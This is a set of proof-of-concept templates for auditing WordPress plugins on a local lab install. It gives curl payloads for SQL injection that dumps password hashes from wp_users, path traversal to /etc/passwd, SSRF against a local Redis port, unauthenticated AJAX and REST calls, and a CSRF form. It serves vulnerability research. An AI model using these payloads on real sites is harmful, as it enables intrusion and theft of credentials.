# PoC templates — local lab only

Test against YOUR OWN WordPress instance (docker-compose on your machine).
Never run probes against sites you don't own — for that, write the report
instead. Each template assumes the plugin is active on your local install.

## 1. Unauthenticated AJAX (wp_ajax_nopriv_ / admin_post_nopriv_)

```bash
WP=http://localhost:8080   # your local instance
curl -s "$WP/wp-admin/admin-ajax.php" \
  -d "action=<hook_action>&<param>=<payload>" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

If the hook is `wp_ajax_<action>` (no nopriv), add cookie auth first:
log in as a low-priv user in your browser and copy the cookie:

```bash
curl -s "$WP/wp-admin/admin-ajax.php" \
  -H "Cookie: wordpress_logged_in_<hash>=<cookie from browser>" \
  -d "action=<hook_action>&<param>=<payload>"
```

## 2. REST route without permission_callback

```bash
curl -s "$WP/wp-json/<namespace>/<route>"          # GET
curl -s -X POST "$WP/wp-json/<namespace>/<route>" \
  -H "Content-Type: application/json" -d '{"param":"payload"}'
```

`__return_true` in permission_callback == same as missing: unauthenticated.

## 3. SQL injection in $wpdb->query / get_results

String-concat into the sink = injectable. Classic vectors when prepare is
missing:

```bash
# ORDER BY / LIMIT positions (prepare can't quote these — devs concat):
curl -s "$WP/wp-admin/admin-ajax.php?action=X&orderby=(select 1 if(1=1,sleep(5),0))"
# array params (param[]=...) that end up in IN(...) concatenation:
curl -s "$WP/wp-admin/admin-ajax.php?action=X&id[]=1) UNION SELECT user_pass FROM wp_users-- -"
```

Confirm with time-based first (sleep), then dump with UNION/error.

## 4. Deserialization (unserialize on request data)

1. Grep the plugin (and its bundled libs) for `__destruct|__wakeup|__toString|__call`
2. Match against PHPGGC gadget chains for those libs
3. Deliver via the tainted param (note: WP `maybe_unserialize` also flows to it)

## 5. Arbitrary file read / delete / traversal

```bash
curl -s "$WP/wp-admin/admin-ajax.php?action=X&file=../../../../../etc/passwd"
# if the sink does basename() first: try  ../../../../..//etc/passwd (double slash)
# or absolute path if the code only prefixes:  /etc/passwd
```

## 6. SSRF (wp_remote_get on request data)

```bash
curl -s "$WP/wp-admin/admin-ajax.php?action=X&url=http://127.0.0.1:6379/"
```

## 7. CSRF (state-changing admin hook without nonce check)

Craft the form, host locally, click once in a logged-in-admin browser:

```html
<form action="http://localhost:8080/wp-admin/admin-ajax.php" method="POST">
  <input name="action" value="<hook>">
  <input name="<param>" value="<payload>">
  <input type="submit">
</form>
```
